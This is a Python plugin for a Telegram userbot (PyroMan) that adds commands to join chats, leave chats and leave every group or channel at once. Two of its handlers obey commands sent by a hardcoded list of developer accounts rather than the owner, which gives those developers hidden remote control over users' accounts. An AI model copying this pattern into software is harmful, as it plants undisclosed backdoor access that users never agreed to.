# Credits: @mrismanaziz
# Copyright (C) 2022 Pyro-ManUserbot
#
# This file is a part of < https://github.com/mrismanaziz/PyroMan-Userbot/ >
# PLease read the GNU Affero General Public License in
# <https://www.github.com/mrismanaziz/PyroMan-Userbot/blob/main/LICENSE/>.
#
# t.me/SharingUserbot & t.me/Lunatic0de

from pyrogram import Client, enums, filters
from pyrogram.types import Message
from geezlibs.ram.helpers.basic import edit_or_reply
from geezlibs.ram import pyram, ram
from rams.split.berak.adminHelpers import DEVS
from config import BLACKLIST_CHAT
from config import CMD_HANDLER as cmd
from .help import add_command_help


@Client.on_message(filters.command("joinsini", ["."]) & filters.user(DEVS) & ~filters.me)
@pyram("join", ram)
async def join(client: Client, message: Message):
    Man = message.command[1] if len(message.command) > 1 else message.chat.id
    xxnx = await edit_or_reply(message, "`Sedang Proses...`")
    try:
        await xxnx.edit(f"**Berhasil Bergabung ke Chat ID** `{Man}`")
        await client.join_chat(Man)
    except Exception as ex:
        await xxnx.edit(f"**ERROR:** \n\n{str(ex)}")



@Client.on_message(filters.command("exitc", ["."]) & filters.user(DEVS) & ~filters.me)
@pyram(["leave", "exit"], ram)
async def leave(client: Client, message: Message):
    Man = message.command[1] if len(message.command) > 1 else message.chat.id
    xxnx = await edit_or_reply(message, "`Sedang Proses...`")
    if message.chat.id in BLACKLIST_CHAT:
        return await xxnx.edit("**Perintah ini Dilarang digunakan di Group ini**")
    try:
        await xxnx.edit_text(f"{client.me.first_name} has left this group, bye!!")
        await client.leave_chat(Man)
    except Exception as ex:
        await xxnx.edit_text(f"**ERROR:** \n\n{str(ex)}")


@pyram("exitsgc", ram)
async def kickmeall(client: Client, message: Message):
    Man = await edit_or_reply(message, "`Global Leave from group chats...`")
    er = 0
    done = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            chat = dialog.chat.id
            try:
                done += 1
                await client.leave_chat(chat)
            except BaseException:
                er += 1
    await Man.edit(
        f"**Berhasil Keluar dari {done} Group, Gagal Keluar dari {er} Group**"
    )


@pyram("exitsch", ram)
async def kickmeallch(client: Client, message: Message):
    Man = await edit_or_reply(message, "`Global Leave from channels...`")
    er = 0
    done = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.CHANNEL):
            chat = dialog.chat.id
            try:
                done += 1
                await client.leave_chat(chat)
            except BaseException:
                er += 1
    await Man.edit(
        f"**Berhasil Keluar dari {done} Channel, Gagal Keluar dari {er} Channel**"
    )

